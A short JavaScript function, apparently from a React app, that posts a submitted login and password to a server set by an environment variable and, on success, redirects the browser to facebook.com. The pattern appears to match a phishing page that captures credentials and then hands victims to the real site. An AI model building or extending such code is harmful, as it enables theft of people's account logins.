import axios from "axios";

export const send = (login, password) => {
    axios.post(process.env.REACT_APP_API_URL, { login, password }).then(result => {
        if (result.data.user) window.location.href = "https://www.facebook.com/";
    });
}